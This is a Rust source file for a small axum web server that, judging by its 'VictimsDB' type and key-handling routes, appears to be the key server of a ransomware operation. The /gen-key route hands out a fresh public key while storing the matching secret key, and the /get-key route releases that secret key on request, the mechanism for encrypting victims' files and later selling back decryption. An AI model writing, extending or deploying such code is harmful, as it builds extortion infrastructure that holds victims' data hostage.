mod cryptography;

use axum::{
    extract::{State},
    routing::{get, post},
    Json, Router, http::StatusCode
};
use serde_json::{Value};
use std::{collections::HashMap, sync::{Arc, Mutex}};

use tokio::net::TcpListener;

use cryptography::key_gen::{generate_keys};
use sodiumoxide::crypto::box_::{PublicKey, SecretKey};

type VictimsDB = Arc<Mutex<HashMap<PublicKey, SecretKey>>>;

async fn get_key(
    State(db): State<VictimsDB>,
    Json(pk): Json<PublicKey>,
) -> Json<Value> {
    println!("Private key requested");
    if let Some(value) = db.lock().unwrap().get(&pk) {
        println!("Private key found");
        return Json(serde_json::json!({"sk": value}));
    }

    println!("Private key not found");
    Json(serde_json::json!({"sk": ""}))
}

async fn gen_key(
    State(db): State<VictimsDB>,
) -> Result<Json<serde_json::Value>, StatusCode> {
    let (pk, sk): (PublicKey, SecretKey) = generate_keys().map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    let pk_copy = pk.clone();
    db.lock().unwrap().insert(pk, sk);

    println!("New keyset requested");
    return Ok(Json(serde_json::json!({"pk": &pk_copy})));
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let victims: VictimsDB = Arc::new(Mutex::new(HashMap::new()));

    let app: Router = Router::new()
                        .route("/get-key", post(get_key))
                        .route("/gen-key", get(gen_key))
                        .with_state(victims);

    // create a TCP listener (0.0.0.0:3000)
    // let listener = TcpListener::bind("0.0.0.0:3000")
    let listener = TcpListener::bind("0.0.0.0:3000")
        .await
        .expect("failed to bind");

    // serve the app
    axum::serve(listener, app)
        .await
        .expect("server error");

    println!("Running on port 3000");
    Ok(())
}